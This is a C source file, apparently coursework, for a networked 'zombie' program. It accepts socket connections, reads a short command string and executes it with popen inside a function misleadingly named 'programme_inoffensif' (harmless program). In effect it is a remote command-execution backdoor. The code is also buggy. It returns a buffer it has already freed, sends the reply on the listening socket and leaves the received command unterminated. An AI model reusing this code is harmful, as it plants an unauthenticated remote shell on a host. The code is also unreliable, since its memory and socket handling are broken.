#include <stdio.h>
#include <stdlib.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <unistd.h>
#include <string.h>

#include "utils_v2.h"
#include "info.h"
#include "reseau.h"

/*
void EndZombieHandler(int num){
    end = 1;
}*/

char* programme_inoffensif(char* commande) 
{
    char* rep = malloc(100 * sizeof(char));
    printf("%d porttt", PORTS[0]);
    printf("%d porttt", NUM_PORTS);
    FILE* fp = popen(commande, "r");
    if (fp == NULL) {
        perror("Erreur lors de l'exécution de la commande");
        return NULL;
    }


    // Lecture réponse 
    fgets(rep, 100, fp);

    // Suppression du caractère de saut de ligne à la fin de la réponse
    size_t len = strlen(rep);
    if (len > 0 && rep[len - 1] == '\n') {
        rep[len - 1] = '\0';
    }

    // Fermeture du flux de fichier
    pclose(fp);

    free(rep);
    return rep;
}

int main(int argc, char *argv[]){
    int sockfd = initSocketZombie();

    int newsockfd;
    
    /*while(!end){*/
    while(true){
        // attend une connexion
        printf("En attente de connexion\n");
        newsockfd = saccept(sockfd);
        printf("Connexion établie\n");

        char* commande = (char*) malloc(10*sizeof(char));
        sread(newsockfd, commande, 10*sizeof(char));
        char* rep = programme_inoffensif(commande);

        sclose(newsockfd);
        // renvoyer la rep de la commande
        swrite(sockfd, rep, sizeof(char)*100);
    }

    return 0;
    
}